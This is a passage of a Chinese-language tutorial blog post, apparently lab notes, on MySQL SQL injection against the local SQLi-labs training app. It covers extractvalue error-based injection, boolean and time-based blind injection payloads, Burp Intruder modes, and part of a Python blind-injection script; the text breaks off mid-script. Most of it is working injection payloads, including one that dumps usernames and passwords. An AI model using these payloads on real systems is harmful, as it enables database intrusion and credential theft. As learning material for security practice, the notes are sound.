class=&#34;line&#34;&gt;concat是针对以行数据做的拼接，而group_concat是针对列做的数据拼接，且group_concat自动生成逗号。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;concat该函数主要针对一行数据中多个字段的拼接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;group_concat该函数主要争对多行数据中[单个/多个]字段的拼接&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h6 id=&#34;7-extractvalue&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7-extractvalue&#34;&gt;#&lt;/a&gt; 7 extractvalue&lt;/h6&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;extractvalue(1,1) 一共可以接收两个参数，报错位置在第二个参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;extravalue(xml标记片段,xpath表达式) 对xml文档在xpath路径进行查询的函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错时返回非法内容,即利用xpath路径错误报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;extractvalue(1,concat(0x7e,(select user()),0x7e))--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;XPATH syntax error: &amp;#x27;~root@localhost~&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;有一点需要注意，extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32,就需要用substring()函数截取，一次查看32位,或者使用limit单次查询&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and extractvalue(1,concat(0x7e,substring((select group_concat(username,&amp;quot;:&amp;quot;,password)from users),1,32),0x7e))--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;报错注入总结：&lt;br&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213222739771.png&#34; alt=&#34;image-20220213222739771&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;盲注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#盲注&#34;&gt;#&lt;/a&gt; 盲注&lt;/h5&gt;
&lt;p&gt;在 SQL 注入过程中，SQL 语句执行后，选择的数据不能回显到前端页面，此时需要利用一些&lt;/p&gt;
&lt;p&gt;方法进行判断或者尝试，这个过程称之为盲注。&lt;/p&gt;
&lt;p&gt;在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响 应时间不同）。一般情况下，盲注可分为两类：&lt;/p&gt;
&lt;p&gt;基于布尔的盲注（Boolean based）&lt;/p&gt;
&lt;p&gt;基于时间的盲注（Time based）&lt;/p&gt;
&lt;p&gt;1. 基于布尔的盲注&lt;/p&gt;
&lt;p&gt;某些场合下，页面返回的结果只有两种（正常或错误）。通过构造 SQL 判断语句，查看页 面的返回结果（True or False）来判断哪些 SQL 判断条件成立，通过此来获取数据库中的 数据。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;前一个为0，后一个为真是or=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id=-1&amp;#x27; or (select substr(version(),1,1)=&amp;#x27;5&amp;#x27;) # &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或使用left截取字符&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and left(version(),1)=5--+  &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果此时不报错或有回显，说明version的第一个字符为5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id=-1&amp;#x27; or (select 1 from information_schema.tables where table_schema=database() and substr(table_name,1,1)=&amp;#x27;u&amp;#x27; limit 0,1) #   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;此时不报错或有回显说明第一字符为u&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或者根据ASCII值来判断&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id=-1&amp;#x27; or (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=database() limit 0,1)&amp;gt;100 #   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;每次取子串，逐个获取对应的ASCII值，获取完整内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mid(&amp;#x27;abcd&amp;#x27;,1,1)  //a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;substring(&amp;#x27;abcd&amp;#x27;,1,1)  //a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或者使用Burp Suite  Intruder&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Position  Sniper 只能设置一个变量&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;设置paylaod&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;attack后会根据设置的值发包，根据可能的Length排序找到正确的值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Battering ram 可以接收两个参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pitchfork 配置两个参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cluster 组合所有可能性发包&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据是否有正确的回显判断&lt;/p&gt;
&lt;p&gt;2. 基于时间的盲注&lt;/p&gt;
&lt;p&gt;又称延时注入，即使用具有延时功能的函数 sleep、benchmark 等，通过判断这些函数是 否正常执行来获取数据库中的数据。&lt;/p&gt;
&lt;p&gt;和布尔盲注的区别在于，无论查询是否成功，前端的页面都一样，而布尔的前提是页面针对是否查询出来有相应的回显&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; or sleep(3) % 23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; or if((select table_name from information_schema.tables where table_schema=database() limit 0,1)&amp;gt;0,sleep(2),0) #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;根据对应的ASCII判断，如果正确停两秒&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id= 1 if((select ascii(substr(table_name,1,1))from information_scheam.tables where table_schema=database() limit 0,1)&amp;gt;96,sleep(2),0) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; and if(ascii(substr(database(),1,1))=115,sleep(3),0) --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;通过逐个字符与ASCII比对，逐个遍历出所有需要的数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;比如database()，数据库长度length(database())&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3. 通过 python 脚本或 sqlmap 进行盲注&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#基于bool盲注&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url1 = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/sqllabs/Less-5/&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;inject_database&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;url1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		low = &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		high = &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; low &amp;lt; high:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;#x27; and ascii(substr((select database()),%d,1)) &amp;gt; %d-- &amp;quot;&lt;/span&gt; % (i, mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			params = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: payload&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			r = requests.get(url1, params=params)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;comment&#34;&gt;# payload = url.format(_ = i, __ = mid)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;comment&#34;&gt;# r = requests.get(payload)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;You are in...........&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; r.text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				low = mid + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				high = mid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; mid == &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		name = name + &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;inject_table&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;url&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		low = &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		high = &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; low &amp;lt; high:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &amp;#x27;sqli&amp;#x27;),%d,1))&amp;gt;%d,1,0)&amp;quot;&lt;/span&gt;%(i,mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			params = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;:payload&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			r = requests.get(url,params = params)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;You are in...........&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; r.text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				low = mid + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				high = mid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; mid == &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		name = name + &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;inject_column&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;url&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		low = &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		high = &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; low &amp;lt; high:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &amp;#x27;flag&amp;#x27;),%d,1))&amp;gt;%d,1,0)&amp;quot;&lt;/span&gt;%(i,mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			params = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;:payload&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			r = requests.get(url,params = params)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;You are in...........&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; r.text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				low = mid + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 